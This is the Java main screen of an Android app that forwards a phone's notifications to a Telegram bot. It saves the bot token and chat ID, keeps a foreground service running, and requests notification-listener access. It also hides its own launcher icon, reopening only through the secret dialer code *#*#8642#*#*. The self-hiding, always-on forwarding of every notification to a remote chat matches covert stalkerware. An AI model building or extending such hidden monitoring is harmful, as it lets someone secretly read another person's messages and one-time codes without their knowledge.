package com.arif.notifforwarder;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private EditText  etBotToken, etChatId, etPrefix;
    private Switch    switchEnabled;
    private Button    btnSave, btnGrant, btnFilter, btnHide;
    private TextView  tvStatus, tvIconStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etBotToken    = findViewById(R.id.etBotToken);
        etChatId      = findViewById(R.id.etChatId);
        etPrefix      = findViewById(R.id.etPrefix);
        switchEnabled = findViewById(R.id.switchEnabled);
        btnSave       = findViewById(R.id.btnSave);
        btnGrant      = findViewById(R.id.btnGrant);
        btnFilter     = findViewById(R.id.btnFilter);
        btnHide       = findViewById(R.id.btnHide);
        tvStatus      = findViewById(R.id.tvStatus);
        tvIconStatus  = findViewById(R.id.tvIconStatus);

        SharedPreferences prefs = getSharedPreferences("notif_prefs", MODE_PRIVATE);
        etBotToken.setText(prefs.getString("bot_token", ""));
        etChatId.setText(prefs.getString("chat_id", ""));
        etPrefix.setText(prefs.getString("prefix", "Notifikasi dari HP:"));
        switchEnabled.setChecked(prefs.getBoolean("enabled", true));

        startForegroundService(new Intent(this, PersistentService.class));

        btnSave.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { doSave(); }
        });

        btnGrant.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        });

        btnFilter.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, AppFilterActivity.class));
            }
        });

        btnHide.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isIconVisible()) showHideDialog();
                else doShowIcon();
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
        updateIconStatus();
    }

    private void doSave() {
        String token  = etBotToken.getText().toString().trim();
        String chatId = etChatId.getText().toString().trim();
        String prefix = etPrefix.getText().toString().trim();
        if (token.isEmpty() || chatId.isEmpty()) {
            Toast.makeText(this, "Bot Token dan Chat ID wajib diisi!", Toast.LENGTH_SHORT).show();
            return;
        }
        getSharedPreferences("notif_prefs", MODE_PRIVATE).edit()
                .putString("bot_token", token)
                .putString("chat_id",   chatId)
                .putString("prefix",    prefix)
                .putBoolean("enabled",  switchEnabled.isChecked())
                .apply();
        Toast.makeText(this, "Pengaturan disimpan!", Toast.LENGTH_SHORT).show();
        updateStatus();
    }

    // ── Ikon ─────────────────────────────────────────────────────────────────

    private boolean isIconVisible() {
        int state = getPackageManager().getComponentEnabledSetting(
                new ComponentName(this, "com.arif.notifforwarder.MainLauncher"));
        return state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void doHideIcon() {
        getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.arif.notifforwarder.MainLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        Toast.makeText(this, "Ikon disembunyikan!\nDial *#*#8642#*#* untuk membuka.",
                Toast.LENGTH_LONG).show();
        finish();
    }

    private void doShowIcon() {
        getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.arif.notifforwarder.MainLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        updateIconStatus();
        Toast.makeText(this, "Ikon ditampilkan kembali.", Toast.LENGTH_SHORT).show();
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Sembunyikan Ikon?")
                .setMessage("App hilang dari beranda.\nUntuk membuka: dial *#*#8642#*#*")
                .setPositiveButton("Sembunyikan", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface d, int w) { doHideIcon(); }
                })
                .setNegativeButton("Batal", null)
                .show();
    }

    // ── Status ────────────────────────────────────────────────────────────────

    private boolean isListenerEnabled() {
        String flat = Settings.Secure.getString(
                getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(
                new ComponentName(this, NotificationForwarderService.class).flattenToString());
    }

    private void updateStatus() {
        if (isListenerEnabled()) {
            tvStatus.setText("Izin notifikasi: AKTIF");
            tvStatus.setTextColor(0xFF2E7D32);
        } else {
            tvStatus.setText("Izin belum diberikan - tekan Izinkan Akses");
            tvStatus.setTextColor(0xFFC62828);
        }
    }

    private void updateIconStatus() {
        if (isIconVisible()) {
            tvIconStatus.setText("Ikon: TERLIHAT di beranda");
            btnHide.setText("Sembunyikan Ikon");
        } else {
            tvIconStatus.setText("Ikon: TERSEMBUNYI");
            btnHide.setText("Tampilkan Ikon Kembali");
        }
    }
}
